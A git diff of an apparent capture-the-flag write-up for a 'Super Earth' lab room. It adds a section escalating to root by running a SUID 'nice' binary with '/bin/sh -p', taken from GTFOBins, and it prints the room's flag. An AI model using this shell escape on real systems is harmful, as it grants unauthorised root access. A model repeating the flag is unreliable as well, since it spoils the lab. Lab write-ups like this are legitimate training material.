@@ -1,4 +1,4 @@
-# Super Earth
+<img width="502" height="212" alt="image" src="https://github.com/user-attachments/assets/c893896a-9620-49a8-9d65-f241f34f84ae" /># Super Earth
 ### For Managed Democracy
 "*The existence of high casualty missions implies the existence of low casualty missions, and we can take some solace in that*"
 
@@ -406,22 +406,13 @@ sh: 0: can't access tty; job control turned off
 # 
 ```
 
-```
-# cd /root
-# ls
-super_sample.txt
-```
-
-cat super_sample photo
-
-Done!
-
-Super Sample: `THM{H0W_4B0UT_A_CUP_0F_L1BER-TEA!}`
-
 Other fun solutions include:
 - enumerating /root directory and saving the results to john folder with john permissions
 - adding a new user with sudo permissions
 - 
+
+You should probably know what to do right now ;)
+If you don't, go to "Get the flag!" section.
 
 ---
 
@@ -443,6 +434,43 @@ john@super-earth:/$ strategem --help
 Usage: strategem [OPTION] [COMMAND [ARG]...]
 Run COMMAND with an adjusted niceness, which affects process scheduling.
 ```
+Nice! It's a tool for "adjusting niceness", otherwise called "nice". (Really! check it up!)
+
+We can *probably* exploit it if it's supposed to help us.
+
+Check its permissions (Special bit)
+```
+
+```
+
+GTFOBins might help us:
+next_pho3
+
+Yes! It contains a "SUID" tab, which we need to exploit the binary. Only thing to do now is:
+```
+nice /bin/sh -p
+```
+```
+john@super-earth:/$ strategem /bin/sh -p
+# whoami
+root
+```
+Let's get that flag.
+
+---
+
+### Get the flag!
+```
+# cd /root
+# ls
+super_sample.txt
+```
+
+cat super_sample photo
+
+Done!
+
+Super Sample: `THM{H0W_4B0UT_A_CUP_0F_L1BER-TEA!}`
 
 ---
 
@@ -459,3 +487,4 @@ Run COMMAND with an adjusted niceness, which affects process scheduling.
 - [what is ssh key](https://www.sectigo.com/blog/what-is-an-ssh-key) 
 - [crontab](https://man7.org/linux/man-pages/man5/crontab.5.html)
 - [bad perms CWE](https://cwe.mitre.org/data/definitions/732.html)
+- [nice](https://man7.org/linux/man-pages/man2/nice.2.html)
